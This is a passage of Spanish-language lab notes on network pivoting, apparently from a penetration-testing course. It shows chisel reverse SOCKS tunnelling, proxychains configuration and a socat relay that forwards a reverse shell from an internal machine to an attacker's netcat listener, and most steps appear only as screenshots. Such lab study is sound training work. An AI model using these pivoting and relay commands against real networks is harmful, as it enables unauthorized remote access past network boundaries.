En la máquina 2, lo que debemos hacer es enviar el tráfico de esta máquina a la de atacante, y para ello usaremos chisel:
![[Pasted image 20240615204122.png]]

![[Pasted image 20240615204125.png]]

Ahora tenemos que ponernos en la máquina atacante con chisel a modo de servidor:
```bash
./chisel server --reverse -p 1234
```

![[Pasted image 20240615204130.png]]

Y ahora en la máquina 1 ejecutamos el chisel en modo cliente diciendo que pase por el puerto 1234 todo el tráfico remoto:
![[Pasted image 20240615204230.png]]

```bash
./chisel client 10.10.10.12:1234 R:socks
```

![[Pasted image 20240615204236.png]]

Y habremos recibido esta conexión también en la máquina atacante:
![[Pasted image 20240615204240.png]]

En la máquina 2, vamos a crear un servidor con python por el puerto 80, que trataremos de visualizar desde la máquina atacante:
![[Pasted image 20240615204245.png]]

![[Pasted image 20240615204248.png]]

Ahora que tenemos el tunel creado que nos une desde la máquina atacante a la máquina 2, debemos de configurar el proxychain de esta forma:
![[Pasted image 20240615204253.png]]

Al ser la primera máquina que conectamos, tenemos que dejar la primera línea sin comentar y la segunda comentada:
![[Pasted image 20240615204257.png]]

Y al final del todo tenemos que dejar esta línea:
![[Pasted image 20240615204317.png]]

Y en el navegador ponemos el tunel:
![[Pasted image 20240615204320.png]]

De tal forma que desde el navegador llegamos correctamente al puerto 80 de la máquina 2:
![[Pasted image 20240615204326.png]]

Ahora, si queremos llegar a esta máquina desde el terminal, debemos de especificar que queremos que el tráfico pase por el proxychains de la siguiente forma:
![[Pasted image 20240615204344.png]]

No obstante, si queremos llegar a esta máquina entablando una reverse shell, veremos que da error:
![[Pasted image 20240615204353.png]]

Esto error ocurre porque tenemos que habilitar socat en la máquina 1 para que pueda haber comunicación entre la máquina 2 y la atacante, por tanto, para seguir avanzando, tenemos que ejecutar el socat dentro de la máquina 1, de tal forma que diremos que el resto del port forwarding que nos llegue lo envíe a la máquina atacante, por tanto lo descargamos:
![[Pasted image 20240615204410.png]]

![[Pasted image 20240615204415.png]]

Nos compartimos el socat con la máquina 1:
![[Pasted image 20240615204419.png]]

![[Pasted image 20240615204422.png]]

Y ahora ejecutamos socat de esta forma, donde diremos que todo lo que reciba la máquina1 por el puerto 1111 de la interfaz 20.20.20.13 lo envíe a la máquina kali  por el puerto 111, que es donde tendremos netcat esperando conexiones:
```bash
./socat tcp-l:1111,fork,reuseaddr tcp:10.10.10.12:111
```

![[Pasted image 20240615204429.png]]

![[Pasted image 20240615204434.png]]

Y ahora si con la máquina 2 enviamos la reverse shell, debería de funcionar:

![[Pasted image 20240615204436.png]]


